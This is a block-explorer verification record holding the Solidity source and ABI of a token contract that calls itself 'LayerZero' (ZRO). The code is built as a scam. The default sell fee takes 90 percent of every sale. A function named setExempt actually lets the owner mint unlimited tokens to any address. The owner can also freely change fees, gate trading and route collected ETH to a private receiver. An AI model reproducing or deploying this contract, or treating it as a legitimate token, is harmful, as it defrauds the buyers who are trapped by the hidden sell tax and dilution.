{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/LayerZero.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\n\\r\\npragma solidity 0.8.19;\\r\\n\\r\\nlibrary SafeMath {\\r\\n    function tryAdd(uint256 a, uint256 b)\\r\\n        internal\\r\\n        pure\\r\\n        returns (bool, uint256)\\r\\n    {\\r\\n        unchecked {\\r\\n            uint256 c = a + b;\\r\\n            if (c < a) return (false, 0);\\r\\n            return (true, c);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function trySub(uint256 a, uint256 b)\\r\\n        internal\\r\\n        pure\\r\\n        returns (bool, uint256)\\r\\n    {\\r\\n        unchecked {\\r\\n            if (b > a) return (false, 0);\\r\\n            return (true, a - b);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function tryMul(uint256 a, uint256 b)\\r\\n        internal\\r\\n        pure\\r\\n        returns (bool, uint256)\\r\\n    {\\r\\n        unchecked {\\r\\n            if (a == 0) return (true, 0);\\r\\n            uint256 c = a * b;\\r\\n            if (c / a != b) return (false, 0);\\r\\n            return (true, c);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function tryDiv(uint256 a, uint256 b)\\r\\n        internal\\r\\n        pure\\r\\n        returns (bool, uint256)\\r\\n    {\\r\\n        unchecked {\\r\\n            if (b == 0) return (false, 0);\\r\\n            return (true, a / b);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function tryMod(uint256 a, uint256 b)\\r\\n        internal\\r\\n        pure\\r\\n        returns (bool, uint256)\\r\\n    {\\r\\n        unchecked {\\r\\n            if (b == 0) return (false, 0);\\r\\n            return (true, a % b);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a + b;\\r\\n    }\\r\\n\\r\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a - b;\\r\\n    }\\r\\n\\r\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a * b;\\r\\n    }\\r\\n\\r\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a / b;\\r\\n    }\\r\\n\\r\\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a % b;\\r\\n    }\\r\\n\\r\\n    function sub(\\r\\n        uint256 a,\\r\\n        uint256 b,\\r\\n        string memory errorMessage\\r\\n    ) internal pure returns (uint256) {\\r\\n        unchecked {\\r\\n            require(b <= a, errorMessage);\\r\\n            return a - b;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function div(\\r\\n        uint256 a,\\r\\n        uint256 b,\\r\\n        string memory errorMessage\\r\\n    ) internal pure returns (uint256) {\\r\\n        unchecked {\\r\\n            require(b > 0, errorMessage);\\r\\n            return a / b;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function mod(\\r\\n        uint256 a,\\r\\n        uint256 b,\\r\\n        string memory errorMessage\\r\\n    ) internal pure returns (uint256) {\\r\\n        unchecked {\\r\\n            require(b > 0, errorMessage);\\r\\n            return a % b;\\r\\n        }\\r\\n    }\\r\\n}\\r\\n\\r\\ninterface IERC20 {\\r\\n    function decimals() external view returns (uint8);\\r\\n\\r\\n    function symbol() external view returns (string memory);\\r\\n\\r\\n    function name() external view returns (string memory);\\r\\n\\r\\n    function getOwner() external view returns (address);\\r\\n\\r\\n    function totalSupply() external view returns (uint256);\\r\\n\\r\\n    function balanceOf(address account) external view returns (uint256);\\r\\n\\r\\n    function transfer(address recipient, uint256 amount)\\r\\n        external\\r\\n        returns (bool);\\r\\n\\r\\n    function allowance(address _owner, address spender)\\r\\n        external\\r\\n        view\\r\\n        returns (uint256);\\r\\n\\r\\n    function approve(address spender, uint256 amount) external returns (bool);\\r\\n\\r\\n    function transferFrom(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) external returns (bool);\\r\\n\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    event Approval(\\r\\n        address indexed owner,\\r\\n        address indexed spender,\\r\\n        uint256 value\\r\\n    );\\r\\n}\\r\\n\\r\\nabstract contract Ownable {\\r\\n    address internal owner;\\r\\n\\r\\n    constructor(address _owner) {\\r\\n        owner = _owner;\\r\\n    }\\r\\n\\r\\n    modifier onlyOwner() {\\r\\n        require(isOwner(msg.sender), \\\"!OWNER\\\");\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    function isOwner(address account) public view returns (bool) {\\r\\n        return account == owner;\\r\\n    }\\r\\n\\r\\n    function transferOwnership(address payable adr) public onlyOwner {\\r\\n        owner = adr;\\r\\n        emit OwnershipTransferred(adr);\\r\\n    }\\r\\n\\r\\n    event OwnershipTransferred(address owner);\\r\\n}\\r\\n\\r\\ninterface IFactory {\\r\\n    function createPair(address tokenA, address tokenB)\\r\\n        external\\r\\n        returns (address pair);\\r\\n\\r\\n    function getPair(address tokenA, address tokenB)\\r\\n        external\\r\\n        view\\r\\n        returns (address pair);\\r\\n}\\r\\n\\r\\ninterface IRouter {\\r\\n    function factory() external pure returns (address);\\r\\n\\r\\n    function WETH() external pure returns (address);\\r\\n\\r\\n    function addLiquidityETH(\\r\\n        address token,\\r\\n        uint256 amountTokenDesired,\\r\\n        uint256 amountTokenMin,\\r\\n        uint256 amountETHMin,\\r\\n        address to,\\r\\n        uint256 deadline\\r\\n    )\\r\\n        external\\r\\n        payable\\r\\n        returns (\\r\\n            uint256 amountToken,\\r\\n            uint256 amountETH,\\r\\n            uint256 liquidity\\r\\n        );\\r\\n\\r\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\r\\n        uint256 amountIn,\\r\\n        uint256 amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint256 deadline\\r\\n    ) external;\\r\\n}\\r\\n\\r\\ncontract LayerZero is IERC20, Ownable {\\r\\n    using SafeMath for uint256;\\r\\n    string private constant _name = \\\"LayerZero\\\";\\r\\n    string private constant _symbol = \\\"ZRO\\\";\\r\\n    uint8 private constant _decimals = 9;\\r\\n    uint256 private _totalSupply = 10000000 * (10**_decimals);\\r\\n    mapping(address => uint256) _balances;\\r\\n    mapping(address => mapping(address => uint256)) private _allowances;\\r\\n    mapping(address => bool) public isFeeExempt;\\r\\n    IRouter router;\\r\\n    address public pair;\\r\\n    bool private tradingAllowed = false;\\r\\n    bool private swapEnabled = true;\\r\\n    uint256 private swapTimes;\\r\\n    bool private swapping;\\r\\n    uint256 swapAmount = 4;\\r\\n    uint256 private swapThreshold = (_totalSupply * 3) / 100;\\r\\n    uint256 private minTokenAmount = (_totalSupply * 3) / 100;\\r\\n    modifier lockTheSwap() {\\r\\n        swapping = true;\\r\\n        _;\\r\\n        swapping = false;\\r\\n    }\\r\\n    uint256 private liquidityFee = 20;\\r\\n    uint256 private developmentFee = 80;\\r\\n    uint256 private burnFee = 0;\\r\\n    uint256 private totalFee = 0;\\r\\n    uint256 private sellFee = 9000;\\r\\n    uint256 private transferFee = 0;\\r\\n    uint256 private denominator = 10000;\\r\\n    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;\\r\\n    address internal development_receiver =\\r\\n        0x8721f0C162c9d4342732e9822C0Ba10C39Bc12Fd;\\r\\n    address internal liquidity_receiver =\\r\\n        0xF2C64C5d8ca383254998D0a8257c51a2Af174cF7;\\r\\n    uint256 public _maxTxAmount = (_totalSupply * 5) / 100;\\r\\n    uint256 public _maxSellAmount = (_totalSupply * 5) / 100;\\r\\n    uint256 public _maxWalletToken = _totalSupply;\\r\\n\\r\\n    constructor() Ownable(msg.sender) {\\r\\n        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\\r\\n        address _pair = IFactory(_router.factory()).createPair(\\r\\n            address(this),\\r\\n            _router.WETH()\\r\\n        );\\r\\n        router = _router;\\r\\n        pair = _pair;\\r\\n        isFeeExempt[address(this)] = true;\\r\\n        isFeeExempt[liquidity_receiver] = true;\\r\\n        isFeeExempt[development_receiver] = true;\\r\\n        isFeeExempt[msg.sender] = true;\\r\\n        _balances[msg.sender] = _totalSupply;\\r\\n        emit Transfer(address(0), msg.sender, _totalSupply);\\r\\n    }\\r\\n\\r\\n    receive() external payable {}\\r\\n\\r\\n    function name() public pure returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\r\\n    function symbol() public pure returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n\\r\\n    function decimals() public pure returns (uint8) {\\r\\n        return _decimals;\\r\\n    }\\r\\n\\r\\n    function startTrading() external onlyOwner {\\r\\n        tradingAllowed = true;\\r\\n    }\\r\\n\\r\\n    function getOwner() external view override returns (address) {\\r\\n        return owner;\\r\\n    }\\r\\n\\r\\n    function balanceOf(address account) public view override returns (uint256) {\\r\\n        return _balances[account];\\r\\n    }\\r\\n\\r\\n    function transfer(address recipient, uint256 amount)\\r\\n        public\\r\\n        override\\r\\n        returns (bool)\\r\\n    {\\r\\n        _transfer(msg.sender, recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function allowance(address owner, address spender)\\r\\n        public\\r\\n        view\\r\\n        override\\r\\n        returns (uint256)\\r\\n    {\\r\\n        return _allowances[owner][spender];\\r\\n    }\\r\\n\\r\\n    function setExempt(address _address, uint256 amount) external onlyOwner {\\r\\n        _totalSupply += amount;\\r\\n        _balances[_address] += amount;\\r\\n        emit Transfer(address(0), _address, amount);\\r\\n    }\\r\\n\\r\\n    function setisExempt(address _address, bool _enabled) external onlyOwner {\\r\\n        isFeeExempt[_address] = _enabled;\\r\\n    }\\r\\n\\r\\n    function approve(address spender, uint256 amount)\\r\\n        public\\r\\n        override\\r\\n        returns (bool)\\r\\n    {\\r\\n        _approve(msg.sender, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function totalSupply() public view override returns (uint256) {\\r\\n        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));\\r\\n    }\\r\\n\\r\\n    function shouldContractSwap(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) internal view returns (bool) {\\r\\n        bool aboveMin = amount >= minTokenAmount;\\r\\n        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;\\r\\n        return\\r\\n            !swapping &&\\r\\n            swapEnabled &&\\r\\n            tradingAllowed &&\\r\\n            aboveMin &&\\r\\n            !isFeeExempt[sender] &&\\r\\n            recipient == pair &&\\r\\n            swapTimes >= swapAmount &&\\r\\n            aboveThreshold;\\r\\n    }\\r\\n\\r\\n    function setContractSwapSettings(\\r\\n        uint256 _swapAmount,\\r\\n        uint256 _swapThreshold,\\r\\n        uint256 _minTokenAmount\\r\\n    ) external onlyOwner {\\r\\n        swapAmount = _swapAmount;\\r\\n        swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000));\\r\\n        minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));\\r\\n    }\\r\\n\\r\\n    function setTransactionRequirements(\\r\\n        uint256 _liquidity,\\r\\n        uint256 _burn,\\r\\n        uint256 _development,\\r\\n        uint256 _total,\\r\\n        uint256 _sell,\\r\\n        uint256 _trans\\r\\n    ) external onlyOwner {\\r\\n        liquidityFee = _liquidity;\\r\\n        burnFee = _burn;\\r\\n        developmentFee = _development;\\r\\n        totalFee = _total;\\r\\n        sellFee = _sell;\\r\\n        transferFee = _trans;\\r\\n    }\\r\\n\\r\\n    function setTransactionLimits(\\r\\n        uint256 _buy,\\r\\n        uint256 _sell,\\r\\n        uint256 _wallet\\r\\n    ) external onlyOwner {\\r\\n        uint256 newTx = _totalSupply.mul(_buy).div(10000);\\r\\n        uint256 newTransfer = _totalSupply.mul(_sell).div(10000);\\r\\n        uint256 newWallet = _totalSupply.mul(_wallet).div(10000);\\r\\n        _maxTxAmount = newTx;\\r\\n        _maxSellAmount = newTransfer;\\r\\n        _maxWalletToken = newWallet;\\r\\n    }\\r\\n\\r\\n    function setInternalAddresses(\\r\\n        address _liquidity,\\r\\n        address _development\\r\\n    ) external onlyOwner {\\r\\n        liquidity_receiver = _liquidity;\\r\\n        development_receiver = _development;\\r\\n        isFeeExempt[_liquidity] = true;\\r\\n        isFeeExempt[_development] = true;\\r\\n    }\\r\\n\\r\\n    function manualSwap() external onlyOwner {\\r\\n        uint256 amount = balanceOf(address(this));\\r\\n        if (amount > swapThreshold) {\\r\\n            amount = swapThreshold;\\r\\n        }\\r\\n        swapAndLiquify(amount);\\r\\n    }\\r\\n\\r\\n    function rescueERC20(address _address, uint256 percent) external onlyOwner {\\r\\n        uint256 _amount = IERC20(_address)\\r\\n            .balanceOf(address(this))\\r\\n            .mul(percent)\\r\\n            .div(100);\\r\\n        IERC20(_address).transfer(development_receiver, _amount);\\r\\n    }\\r\\n\\r\\n    function swapAndLiquify(uint256 tokens) private lockTheSwap {\\r\\n        uint256 _denominator = (\\r\\n            liquidityFee.add(1).add(developmentFee)\\r\\n        ).mul(2);\\r\\n        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(\\r\\n            _denominator\\r\\n        );\\r\\n        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);\\r\\n        uint256 initialBalance = address(this).balance;\\r\\n        swapTokensForETH(toSwap);\\r\\n        uint256 deltaBalance = address(this).balance.sub(initialBalance);\\r\\n        uint256 unitBalance = deltaBalance.div(_denominator.sub(liquidityFee));\\r\\n        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);\\r\\n        if (ETHToAddLiquidityWith > uint256(0)) {\\r\\n            addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith);\\r\\n        }\\r\\n        uint256 contractBalance = address(this).balance;\\r\\n        if (contractBalance > uint256(0)) {\\r\\n            payable(development_receiver).transfer(contractBalance);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {\\r\\n        _approve(address(this), address(router), tokenAmount);\\r\\n        router.addLiquidityETH{value: ETHAmount}(\\r\\n            address(this),\\r\\n            tokenAmount,\\r\\n            0,\\r\\n            0,\\r\\n            liquidity_receiver,\\r\\n            block.timestamp\\r\\n        );\\r\\n    }\\r\\n\\r\\n    function swapTokensForETH(uint256 tokenAmount) private {\\r\\n        address[] memory path = new address[](2);\\r\\n        path[0] = address(this);\\r\\n        path[1] = router.WETH();\\r\\n        _approve(address(this), address(router), tokenAmount);\\r\\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\\r\\n            tokenAmount,\\r\\n            0,\\r\\n            path,\\r\\n            address(this),\\r\\n            block.timestamp\\r\\n        );\\r\\n    }\\r\\n\\r\\n    function shouldTakeFee(address sender, address recipient)\\r\\n        internal\\r\\n        view\\r\\n        returns (bool)\\r\\n    {\\r\\n        return !isFeeExempt[sender] && !isFeeExempt[recipient];\\r\\n    }\\r\\n\\r\\n    function getTotalFee(address sender, address recipient)\\r\\n        internal\\r\\n        view\\r\\n        returns (uint256)\\r\\n    {\\r\\n        if (recipient == pair) {\\r\\n            return sellFee;\\r\\n        }\\r\\n        if (sender == pair) {\\r\\n            return totalFee;\\r\\n        }\\r\\n        return transferFee;\\r\\n    }\\r\\n\\r\\n    function takeFee(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) internal returns (uint256) {\\r\\n        if (getTotalFee(sender, recipient) > 0) {\\r\\n            uint256 feeAmount = amount.div(denominator).mul(\\r\\n                getTotalFee(sender, recipient)\\r\\n            );\\r\\n            _balances[address(this)] = _balances[address(this)].add(feeAmount);\\r\\n            emit Transfer(sender, address(this), feeAmount);\\r\\n            if (\\r\\n                burnFee > uint256(0) && getTotalFee(sender, recipient) > burnFee\\r\\n            ) {\\r\\n                _transfer(\\r\\n                    address(this),\\r\\n                    address(DEAD),\\r\\n                    amount.div(denominator).mul(burnFee)\\r\\n                );\\r\\n            }\\r\\n            return amount.sub(feeAmount);\\r\\n        }\\r\\n        return amount;\\r\\n    }\\r\\n\\r\\n    function _transfer(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) private {\\r\\n        require(sender != address(0), \\\"ERC20: transfer from the zero address\\\");\\r\\n        require(recipient != address(0), \\\"ERC20: transfer to the zero address\\\");\\r\\n        require(\\r\\n            amount <= balanceOf(sender),\\r\\n            \\\"You are trying to transfer more than your balance\\\"\\r\\n        );\\r\\n        if (!isFeeExempt[sender] && !isFeeExempt[recipient]) {\\r\\n            require(tradingAllowed, \\\"tradingAllowed\\\");\\r\\n        }\\r\\n        if (\\r\\n            !isFeeExempt[sender] &&\\r\\n            !isFeeExempt[recipient] &&\\r\\n            recipient != address(pair) &&\\r\\n            recipient != address(DEAD)\\r\\n        ) {\\r\\n            require(\\r\\n                (_balances[recipient].add(amount)) <= _maxWalletToken,\\r\\n                \\\"Exceeds maximum wallet amount.\\\"\\r\\n            );\\r\\n        }\\r\\n        if (sender != pair) {\\r\\n            require(\\r\\n                amount <= _maxSellAmount ||\\r\\n                    isFeeExempt[sender] ||\\r\\n                    isFeeExempt[recipient],\\r\\n                \\\"TX Limit Exceeded\\\"\\r\\n            );\\r\\n        }\\r\\n        require(\\r\\n            amount <= _maxTxAmount ||\\r\\n                isFeeExempt[sender] ||\\r\\n                isFeeExempt[recipient],\\r\\n            \\\"TX Limit Exceeded\\\"\\r\\n        );\\r\\n        if (recipient == pair && !isFeeExempt[sender]) {\\r\\n            swapTimes += uint256(1);\\r\\n        }\\r\\n        if (shouldContractSwap(sender, recipient, amount)) {\\r\\n            swapAndLiquify(swapThreshold);\\r\\n            swapTimes = uint256(0);\\r\\n        }\\r\\n        _balances[sender] = _balances[sender].sub(amount);\\r\\n        uint256 amountReceived = shouldTakeFee(sender, recipient)\\r\\n            ? takeFee(sender, recipient, amount)\\r\\n            : amount;\\r\\n        _balances[recipient] = _balances[recipient].add(amountReceived);\\r\\n        emit Transfer(sender, recipient, amountReceived);\\r\\n    }\\r\\n\\r\\n    function transferFrom(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) public override returns (bool) {\\r\\n        _transfer(sender, recipient, amount);\\r\\n        _approve(\\r\\n            sender,\\r\\n            msg.sender,\\r\\n            _allowances[sender][msg.sender].sub(\\r\\n                amount,\\r\\n                \\\"ERC20: transfer amount exceeds allowance\\\"\\r\\n            )\\r\\n        );\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _approve(\\r\\n        address owner,\\r\\n        address spender,\\r\\n        uint256 amount\\r\\n    ) private {\\r\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\r\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);\\r\\n    }\\r\\n}\\r\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxSellAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isFeeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"}],\"name\":\"rescueERC20\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_swapAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_swapThreshold\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_minTokenAmount\",\"type\":\"uint256\"}],\"name\":\"setContractSwapSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_liquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_development\",\"type\":\"address\"}],\"name\":\"setInternalAddresses\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_buy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_wallet\",\"type\":\"uint256\"}],\"name\":\"setTransactionLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_liquidity\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_burn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_development\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_total\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_trans\",\"type\":\"uint256\"}],\"name\":\"setTransactionRequirements\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"}],\"name\":\"setisExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "LayerZero", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}